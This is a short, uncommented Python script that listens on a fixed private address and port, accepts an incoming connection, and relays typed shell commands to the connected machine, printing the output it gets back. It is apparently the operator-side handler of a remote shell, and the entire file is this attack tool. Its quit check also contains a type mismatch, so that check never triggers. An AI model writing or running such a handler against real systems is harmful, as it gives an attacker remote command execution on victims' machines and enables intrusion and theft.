import socket

host = '192.168.153.1'
port = 5656
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(10)

conn, addr = s.accept()
print('Connected by ', addr)
data = conn.recv(1024)
while 1:
    command =input("Enter shell command or quit: ")
    conn.send(command.encode())
    if command == b"quit": break
    data = conn.recv(4096)
    print(data.decode('gbk'))
conn.close()